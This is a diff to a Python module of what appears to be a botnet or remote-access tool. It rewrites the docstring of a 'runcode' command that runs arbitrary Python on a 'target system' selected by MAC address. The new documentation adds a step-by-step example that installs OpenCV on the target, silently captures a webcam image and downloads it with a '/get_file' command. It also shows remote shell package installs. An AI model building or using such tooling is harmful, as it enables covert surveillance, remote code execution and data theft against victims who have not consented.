@@ -7,26 +7,54 @@ from .. import BotNet, Context, UserException
 
 @BotNet.default_script(script_version="0.0.1")
 def runcode(context: Context) -> str:
-    """run python code on target system and return stdout
+    """Run python code on target system and return stdout
+
     syntax:
-    `/runcode CODE`
-        or 
-    `[mac-address] /runcode CODE`
+        `/runcode CODE`
+            or 
+        `[mac-address] /runcode CODE`
 
-    example command:
+    Note:
+    If you need import some not built in library, first install it on target system and then you can use it in your code.
 
-    `8548646486648 /runcode print("Hello World")` \n
-    `/runcode print("Hello World")` \n
-
-    `/runcode from time import sleep\n
-    for n in range(10):
-        sleep(1)
-        print(n)`
-
-    if you need import some not built in library, first install it on target system and then you can use it in your code.
     example install library:
         `/shell pip install requests`
-    """
+
+----------Example 0----------
+
+`/runcode print("Hello World")` \n
+
+----------Example 1----------
+
+```
+/runcode from time import sleep\n
+for n in range(10):
+    sleep(1)
+    print(n)
+```
+
+----------Example 2 (Get image from webcam)----------
+
+Step (1): Install opencv
+
+`/shell pip install opencv-python`
+
+
+Step (2): Get image and save to file
+
+```
+/runcode import cv2
+cap = cv2.VideoCapture(0)
+_, img = cap.read()
+cv2.imwrite('test.jpg', img)
+```
+
+
+Step (3): Download image
+
+`/get_file test.jpg`
+
+"""
     if len(context.command) > 0:
         code = " ".join(context.command)
         # run code in thread to avoid blocking main thread
